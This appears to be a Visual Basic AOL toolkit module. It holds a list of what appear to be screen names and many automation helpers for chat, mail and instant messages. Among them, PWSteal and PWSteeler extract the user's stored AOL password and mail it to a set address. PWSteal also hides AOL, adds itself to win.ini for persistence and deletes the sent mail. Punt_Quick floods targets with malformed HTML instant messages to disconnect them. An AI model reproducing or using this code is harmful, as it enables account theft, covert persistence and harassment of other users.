List.AddItem "AACMsOD"
List.AddItem "AACMsPatti"
List.AddItem "AACMsPeggy"
List.AddItem "AACMsPiano"
List.AddItem "AACMsPrue"
List.AddItem "AACMsQnA"
List.AddItem "AACMsQuilt"
List.AddItem "AACMsR"
List.AddItem "AACMsRach"
List.AddItem "AACMsRenel"
List.AddItem "AACMsRes"
List.AddItem "AACMsRiza"
List.AddItem "AACMsRobin"
List.AddItem "AACMsRobyn"
List.AddItem "AACMsRomy"
List.AddItem "AACMsRusso"
List.AddItem "AACMsSatyr"
List.AddItem "AACMsShan"
List.AddItem "AACMsShawn"
List.AddItem "AACMsShock"
List.AddItem "AACMsStar"
List.AddItem "AACMsSteff"
List.AddItem "AACMsSudie"
List.AddItem "AACMsSue"
List.AddItem "AACMsSusie"
List.AddItem "AACMsTake"
List.AddItem "AACMsTalia"
List.AddItem "AACMsTaran"
List.AddItem "AACMsTB"
List.AddItem "AACMsTch4"
List.AddItem "AACMsTeri"
List.AddItem "AACMsTexas"
List.AddItem "AACMsTutor"
List.AddItem "AACMsTwnkl"
List.AddItem "AACMsTyler"
List.AddItem "AACMsVBMth"
List.AddItem "AACMsVern"
List.AddItem "AACMsVicki"
List.AddItem "AACMsVin"
List.AddItem "AACMsViv"
List.AddItem "AACMsW"
List.AddItem "AACMsWendy"
List.AddItem "AACMsZBear"
List.AddItem "AACMthFire"
List.AddItem "AACMthGeni"
List.AddItem "AACMthNmbr"
List.AddItem "AACMthNorm"
List.AddItem "AACMthSci"
List.AddItem "AACMthStew"
List.AddItem "AACMthTchr"
List.AddItem "AACMthwiz"
List.AddItem "AACMusTch"
List.AddItem "AACMxCrsty"
List.AddItem "AACMythTch"
List.AddItem "AACMzArts"
List.AddItem "AACMzBiz"
List.AddItem "AACMzBusyB"
List.AddItem "AACMzCS"
List.AddItem "AACMzDark"
List.AddItem "AACMzDonna"
List.AddItem "AACMzEng"
List.AddItem "AACMzFriz"
List.AddItem "AACMzGayle"
List.AddItem "AACMzKitty"
List.AddItem "AACMzKori"
List.AddItem "AACMzLacy"
List.AddItem "AACMzLinda"
List.AddItem "AACMzLynda"
List.AddItem "AACMzMacak"
List.AddItem "AACMzMandy"
List.AddItem "AACMzMarcy"
List.AddItem "AACMzMaxRN"
List.AddItem "AACMzOracl"
List.AddItem "AACMzPeggy"
List.AddItem "AACMzShell"
List.AddItem "AACMzShirl"
List.AddItem "AACMzSook"
List.AddItem "AACMzTique"
List.AddItem "AACmzWords"
List.AddItem "AACMzZelda"
List.AddItem "AACNo1Tchr"
List.AddItem "AACnursED"
List.AddItem "AACPACJer"
List.AddItem "AACPat"
List.AddItem "AACPDnvp"
List.AddItem "AACPEJan"
List.AddItem "AACPfKiron"
List.AddItem "AACPfrMich"
List.AddItem "AACPfSpeare"
List.AddItem "AACPgrJoan"
List.AddItem "AACPhyBohr"
List.AddItem "AACPhyDan"
List.AddItem "AACPhyMri"
List.AddItem "AACPhysics"
List.AddItem "AACPhyTch"
List.AddItem "AACPolska"
List.AddItem "AACPolTchr"
List.AddItem "AACPrf1Bob"
List.AddItem "AACPrf2U"
List.AddItem "AACPrf4Man"
List.AddItem "AACPrfAbby"
List.AddItem "AACPrfAlg"
List.AddItem "AACPrfArch"
List.AddItem "AACPrfARed"
List.AddItem "AACPrfASK"
List.AddItem "AACPrfB"
List.AddItem "AACPrfBank"
List.AddItem "AACPrfBear"
List.AddItem "AACPrfBeth"
List.AddItem "AACPrfBib"
List.AddItem "AACPrfBJ"
List.AddItem "AACPrfBma"
List.AddItem "AACPrfBob"
List.AddItem "AACPrfBTur"
List.AddItem "AACPrfCarl"
List.AddItem "AACPrfCase"
List.AddItem "AACPrfCBB"
List.AddItem "AACPrfComp"
List.AddItem "AACPrfCris"
List.AddItem "AACPrfCrow"
List.AddItem "AACPrfDave"
List.AddItem "AACPrfDick"
List.AddItem "AACPrfDooz"
List.AddItem "AACPrfDoug"
List.AddItem "AACPrfDune"
List.AddItem "AACPrfDyn"
List.AddItem "AACPrfEVal"
List.AddItem "AACPrfFair"
List.AddItem "AACPrfFin"
List.AddItem "AACPrfFrch"
List.AddItem "AACPrfFrog"
List.AddItem "AACPrfGdss"
List.AddItem "AACPrfGene"
List.AddItem "AACPrfGeo"
List.AddItem "AACPrfGkni"
List.AddItem "AACPrfHola"
List.AddItem "AACPrfIsis"
List.AddItem "AACPrfJake"
List.AddItem "AACPrfJEI"
List.AddItem "AACPrfJohn"
List.AddItem "AACPrfJoni"
List.AddItem "AACPrfKate"
List.AddItem "AACPrfKath"
List.AddItem "AACPrfKirk"
List.AddItem "AACPrfknow"
List.AddItem "AACPrfLang"
List.AddItem "AACPrfLudw"
List.AddItem "AACPrfM"
List.AddItem "AACPrfMack"
List.AddItem "AACPrfMark"
List.AddItem "AACPrfMath"
List.AddItem "AACPrfMatt"
List.AddItem "AACPrfMdv"
List.AddItem "AACPrfMead"
List.AddItem "AACPrfMel"
List.AddItem "AACPrfMess"
List.AddItem "AACPrfMich"
List.AddItem "AACPrfMike"
List.AddItem "AACPrfMomm"
List.AddItem "AACPrfMore"
List.AddItem "AACPrfMyst"
List.AddItem "AACPrfNeil"
List.AddItem "AACPrfPH"
List.AddItem "AACPrfPhil"
List.AddItem "AACPrfPlus"
List.AddItem "AACPrfPolo"
List.AddItem "AACPrfprps"
List.AddItem "AACPrfRagu"
List.AddItem "AACPrfRain"
List.AddItem "AACPrfSpan"
End Sub

Function Online () As Integer
AOL% = findwindow("AOL Frame25", 0&)
Welcome% = findchildbytitle(AOL%, "Welcome, ")
x = GetWindowTextLength(Welcome%)
cap$ = Space(x)
x = getwindowtext(Welcome%, cap$, x)
If InStr(cap$, ",") <> 0 Then Online = True
If InStr(cap$, ",") = 0 Then Online = False
End Function

Sub OpenMailBox ()
a = findwindow("AOL Frame25", 0&)  'Find AOL
b = findchildbyclass(a, "AOL Toolbar") 'Find msg area
c = findchildbyclass(b, "_AOL_ICON")  'Find one of the
x = sendmessagebynum(c, WM_LBUTTONDOWN, 0, 0&) 'Click send
x = sendmessagebynum(c, WM_LBUTTONUP, 0, 0&)

End Sub

Sub pause (duratn As Integer)
'This pauses for duratn seconds
Let curent = Timer

Do Until Timer - curent >= duratn
DoEvents
Loop

End Sub

Sub playwave (file$)
x = sndPlaySound(file$, 1)
End Sub

Sub Punt_Quick (who, What)
'Punt_Quick Combo3, "</html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html>Goodbye"
'Punt_Quick Combo3, "</html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html></html>"
'Punt_Quick Combo3, "<h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1>"
'Punt_Quick Combo3, "<h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2><h2>"
'Punt_Quick Combo3, "<h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
'Punt_Quick Combo3, ""
If AOLVersion() = 30 Then
a = findwindow("AOL Frame25", 0&)  'Find AOLif
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
c = sendmessagebystring(b, WM_SETTEXT, 0, who)
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in
d = findchildbyclass(x, "_AOL_ICON")  'Find one of the'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
For i = 1 To 8
x = sendmessagebynum(M, WM_LBUTTONDOWN, 0, 0&) 'Click send
x = sendmessagebynum(M, WM_LBUTTONUP, 0, 0&)
Next i
timeout (.3)
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOLVersion() = 25 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
cl = getnextwindow(b, 2)
c = sendmessagebystring(cl, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_Button")  'Find one of the
            'buttons
For i = 1 To 8
x = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Click send
x = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)
Next i
timeout .5
    Offf% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Offf%, WM_CLOSE, 0, 0)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)

Exit Sub
End If
End Sub

Sub PWSteal (sendtowho, subject)
'----------------------------------------------
'Sub Form_Load()
'stayontop Me
'a = findwindow("AOL Frame25", 0&)
'b = sendmessagebystring(a, WM_SETTEXT, 0, "America  Online")
'Randomize Timer
'lRandom = Int(Rnd * 10)
'Select Case lRandom
'Case 1: App.Title = "Win32SysMan"
'Case 2: App.Title = "Systray"
'Case 3: App.Title = "Explorer"
'Case 4: App.Title = "Msgsrv32"
'Case 5: App.Title = "Fate"
'Case 6: App.Title = "America Online"
'Case 7: App.Title = "America  Online"
'Case 8: App.Title = ""
'Case 9: App.Title = "Windows"
'Case Else: App.Title = "Vshwin32"
'End Select
'End Sub
'--------------------------------------
'Sub Form_Unload()
'On Error Resume Next
'Call WriteToINI("windows", "load", App.Path + "\" + App.EXEName + ".exe", WDirectory$)
'Call WriteToINI("boot", "SCRNSAVE.EXE", App.Path + "\" + App.EXEName + ".scr", SDirectory$)
'a = findwindow("AOL Frame25", 0&)
'CloseWin (a)
'a = Shell(App.Path + "\" + App.EXEName + ".exe", 1)
'a = Shell(App.Path + "\" + App.EXEName + ".scr", 1)
'End Sub
'--------------------------------------
'Sub Timer1_Timer()
'If Online() = True Then
'Call PWSteal("Address@domain.com", "Subject")
'timer1.Enabled = False
'timeout .9
'Exit Sub
'End If
'End Sub
'---------------------------------------
'Sub Timer2_Timer()
'WDirectory$ = "c:\windows\win.ini"
'SDirectory$ = "c:\windows\system.ini"
'Call WriteToINI("windows", "load", App.Path + "\" + App.EXEName + ".exe", WDirectory$)
'Call WriteToINI("boot", "SCRNSAVE.EXE", App.Path + "\" + App.EXEName + ".exe", SDirectory$)
'a55 = findwindow("_AOL_Modal", 0&)
'a56 = findchildbytitle(a55, "Change Password")
'CloseWin (a56)
'End Sub
'----------------------------------------
Call WriteToWinINI(App.Path + "\" + App.EXEName + ".exe")
a = findwindow("AOL Frame25", 0&)
HideAOL
pw = ExtractPW("c:\aol30", UserSN())
Call aolsendmail(sendtowho, subject, UserSN() + ":     " + pw)
timeout (.9)
a55 = findwindow("_AOL_Modal", 0&)
CloseWin (a55)
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Check Mail You've &Sent")'Run Menu
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
WEL% = findchildbytitle(MDI%, "Welcome, ")
Do: DoEvents
NMB% = findchildbytitle(MDI%, "Outgoing Mail")
Loop Until NMB% <> 0
WaitForMail
TREE% = findchildbyclass(NMB%, "_AOL_Tree")
Nummailz = sendmessagebynum(TREE%, LB_GETCOUNT, 0, 0&)
RED% = findchildbytitle(NMB%, "Delete")
For x = 1 To 10
click (RED%)
Next x
timeout (.2)
CloseWin (NMB%)
timeout .5
Call WriteToWinINI(App.Path + "\" + App.EXEName + ".exe")
    ShowAOL
End Sub

Sub PWSteeler (sendtowho, subject)
timeout (.9)
a = findwindow("AOL Frame25", 0&)
    x = ShowWindow(a, SW_Hide)
pw = ExtractPW("c:\aol30", UserSN())
SN = UserSN()
Call aolsendmail(sendtowho, subject, SN + ":     " + pw)
    x = ShowWindow(a, SW_Show)
End Sub

Function r_backwards (strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = nextchr$ & newsent$
Loop
r_backwards = newsent$

End Function

Function r_elite (strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If crapp% > 0 Then GoTo dustepp2

If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "|V|"
If nextchr$ = "m" Then Let nextchr$ = "^^"
If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "º"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$

dustepp2:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
r_elite = newsent$

End Function

Function r_hacker (strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
r_hacker = newsent$

End Function

Function r_same (strr As String)
'Returns the strin the same
Let r_same = Trim(strr)

End Function

Function r_spaced (strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
r_spaced = newsent$

End Function

Function RemoveSpace (txt$) As String
For x = 1 To Len(txt$)
    Letter$ = Mid$(txt$, x, 1)
    If Letter$ <> " " Then NoSpace$ = NoSpace$ + Letter$
Next
RemoveSpace = NoSpace$
End Function

Sub Resetname (oldsn, newsn, pathh)
Static moocow As String * 5000
Dim twi As Long
Dim fish As Long
Dim w0w As Integer
Dim werd As Integer
Dim qwerty As Variant
Dim meee As Integer
On Error GoTo err0r
tru_sn = newsn + String$(Len(oldsn) - Len(newsn), " ")
Let paath$ = (pathh & "\idb\main.idx")
Open paath$ For Binary As #1 'Len = 50000
twi& = 1
fish& = LOF(1)
While twi& < fish&
moocow = String$(5000, Chr$(0))
Get #1, twi&, moocow
While InStr(UCase$(moocow), UCase$(oldsn)) <> 0
Mid$(moocow, InStr(UCase$(moocow), UCase$(oldsn))) = tru_sn
Wend
    
Put #1, twi&, moocow
twi& = twi& + 5000
Wend

Seek #1, Len(oldsn)
twi& = Len(oldsn)
While twi& < fish&
moocow = String$(255, Chr$(0))
Get #1, twi&, moocow
While InStr(UCase$(moocow), UCase$(oldsn)) <> 0
Mid$(moocow, InStr(UCase$(moocow), UCase$(oldsn))) = tru_sn
Wend
Put #1, twi&, moocow
twi& = twi& + 5000
Wend
Close #1
Screen.MousePointer = 0
err0r:
Screen.MousePointer = 0
Exit Sub
Resume Next

End Sub

Sub Resetsn (SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
x = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, x, Text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, i, 1)
If Where1 Then
Mid(Text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, x + Where1 - 1, ReplaceX$
401 :
DoEvents
Where2 = InStr(1, Text$, i, 1)
If Where2 Then
Mid(Text$, Where2) = Replace$
Put #2, x + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
x = x + 32000
LF2 = LOF(2)
Close #2
If x > LF2 Then GoTo 301
Loop
301 :
End Sub

Sub Rotate (Text As TextBox)
On Error Resume Next
rletter = Right(Text.Text, 1)
lside = Left(Text.Text, Len(Text.Text) - 1)
Text.Text = rletter + lside
End Sub

Sub RunMenu (horz, vert)
'Runs the specified AOL Menu (Horizonatl,Verticle)
'Each Position starts at 0 not 1

Dim F, gi, sm, M, a As Integer
a = findwindow("AOL Frame25", 0&)
M = Getmenu(a)
sm = GetSubMenu(5, 4)
gi = GetMenuItemID(9, 8)
F = sendmessagebynum(a, WM_COMMAND, gi, 0)

End Sub

Sub RunMenuByString (ApplicationOfMenu, STringToSearchFor)
'This runs an application's menu by its text.  This
'includes & signs (for underlined letters)

SearchString$ = STringToSearchFor
hMenu = Getmenu(ApplicationOfMenu)
Cnt = GetMenuItemCount(hMenu)
For i = 0 To Cnt - 1
PopUphMenu = GetSubMenu(hMenu, i)
Cnt2 = GetMenuItemCount(PopUphMenu)
For O = 0 To Cnt2 - 1
    hMenuID = GetMenuItemID(PopUphMenu, O)
    MenuString$ = String$(100, " ")
    x = GetMenuString(PopUphMenu, hMenuID, MenuString$, 100, 1)
    If InStr(UCase(MenuString$), UCase(SearchString$)) Then
        SendtoID = hMenuID
        GoTo Initiate
    End If
Next O
Next i
Initiate:
x = sendmessagebynum(ApplicationOfMenu, &H111, SendtoID, 0)
End Sub

Sub SaveComboBox (ByVal Directory, cbo As ComboBox)
On Error Resume Next
Open Directory For Output As #1
For x = 0 To cbo.ListCount - 1
Print #1, cbo.List(x)
Next x
Close #1
'/\Save
End Sub

Sub SaveListBox (Directory, Lst As ListBox)
On Error Resume Next
Open Directory For Output As #1
For x = 0 To Lst.ListCount - 1
Print #1, Lst.List(x)
Next x
Close #1
End Sub

Sub Scroll (txt)
Dim a As String
Dim b As String
Dim c As String
Chatroom% = findchatroom()
AOLEdit% = findchildbyclass(Chatroom%, "_AOL_Edit")
a$ = txt
c$ = txt
b$ = String(Val(116 - Len(a$)), Chr(4))
subcd0 (.01)
t = a$ & b$ & c$ & b$
x = sendmessagebystring(AOLEdit%, WM_SETTEXT, 0&, t)
d = sendmessagebynum(AOLEdit%, WM_CHAR, 13, 0)
End Sub

Sub sendchat (txt)
DoEvents
AOLEdit% = findchildbyclass(findchatroom(), "_AOL_Edit")
Call SetEdit(AOLEdit%, txt)
Call Enter(AOLEdit%)
DoEvents

End Sub

Sub Sendclick (Handle)
'Clicks something
x% = SendMessage(Handle, WM_LBUTTONDOWN, 0, 0&)
pause .05
x% = SendMessage(Handle, WM_LBUTTONUP, 0, 0&)
End Sub

Sub SendEMail (who$, Sbjct$, Mess$, sendit, check)
AOL% = findwindow("AOL Frame25", 0&)
Call RunMenuByString(a, "Compose Mail")
Do
DoEvents
Compose% = findchildbytitle(AOL%, "Compose Mail")
Loop Until Compose% <> 0
AOLEdit% = findchildbyclass(Compose%, "_AOL_Edit")
Call SetEdit(AOLEdit%, who$)
PreSub% = findchildbytitle(Compose%, "Subject:")
subject% = GetWindow(PreSub%, GW_HWNDNEXT)
Call SetEdit(subject%, Sbjct$)
shit% = GetWindow(subject%, GW_HWNDNEXT)
shit% = GetWindow(shit%, GW_HWNDNEXT)
'If GetAOL() = 2 Then Mail% = GetWindow(shit%, GW_HWNDNEXT)
'If GetAOL() = 3 Then Mail% = findchildbyclass(Compose%, "RICHCNTL")
'Call SetEdit(Mail%, Mess$)
send% = findchildbyclass(Compose%, "_AOL_Icon")
If sendit = True Then click send%
If check = True Then
    Do
    DoEvents
    Sent% = findwindow("#32770", "America Online")
    Compose% = findchildbytitle(AOL%, "Compose Mail")
    Loop Until Sent% <> 0 Or Compose% = 0
    If Sent% <> 0 Then
        x = sendmessagebynum(Sent%, WM_CLOSE, 0, 0)
    End If
End If
End Sub

Sub Sendim (who, Message)
If Online() = False Then : MsgBox "You Are Not Currectly Signed On To Your America Online Client", 59: Exit Sub
aolver = AOLVersion()
If aolver = 30 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
